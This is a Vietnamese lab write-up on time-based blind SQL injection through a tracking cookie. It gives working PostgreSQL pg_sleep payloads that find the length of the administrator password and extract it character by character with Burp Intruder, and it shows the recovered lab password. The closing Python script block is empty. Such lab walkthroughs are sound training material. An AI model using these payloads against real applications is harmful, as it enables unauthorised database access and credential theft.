![[Pasted image 20260618125658.png]]
# Tổng quan
-Lab có lỗ hổng blind SQLi.App sử dụng tracking cookie để query SQL
-Kết quả của truy vấn SQL không được trả về, và app không phản hồi gì
-Database có chứa một table là `users` với các bảng `username` và `password`
=>Ta cần khai thác Blind SQLi để tìm password của tài khoản `administrator`
# Khai thác
-Vì theo như mô tả thì lab có Tracking cookie để query SQL nên ta có thể suy ra được là lỗ hổng blind SQLi nằm ở parameter TrackingId
-Ta sử dụng payload sau:
```SQL
';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
-Giải thích payload:
+ Dấu `'` dùng để đóng câu truy vấn và ta dùng `;` để dùng stack queries(Lý do cho việc này là vì Server không trả về lỗi nên ta không thể dùng `ORDER BY 1,2,3--`.Thêm cả `UNION SELECT` vì đây là câu `SELECT` gọi hàm )
-Ta quay lại với Burp, viết payload + `Ctrl U` để test xem payload có hiệu quả không:
![[Pasted image 20260618203246.png]]

Và bùm:
![[Pasted image 20260618203350.png]]
Web bị delay thêm 10s => payload hoạt động.
Tiếp theo ta cần biết password của `administrator` có độ dài bao nhiêu:
```SQL
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>30) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
--Trả về false(delay 0s)
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)<30) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
--Trả về true(delay 10s)
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)<20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
--Trả về false(delay 0s)
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)<21) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
--Trả về true(delay 10s)
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
--Trả về true(delay 10s)
```
Vậy ta biết được rằng là password có 20 ký tự,tiếp theo ta dùng `Burp Intruder`:
```SQL
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
ta thêm list `a-z,A-Z,0-9` rồi bấm start attack:
![[Pasted image 20260618210404.png]]
Đợi 10s và bấm vào `response received` để nó hiện value lớn nhất => đó chính là ký tự đầu tiên của password chỉ cần thay:
```SQL
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
ta sẽ tìm được ký tự 2 rồi tiếp đến ký tự 3.
Kiên trì một lúc ta được mật khẩu:`dq4nn3l1d5omzqgw7mld`

Một cách khác thay vì mất thời gian dùng `Burp Intruder` ta có thể viết Script Python:
```Python

```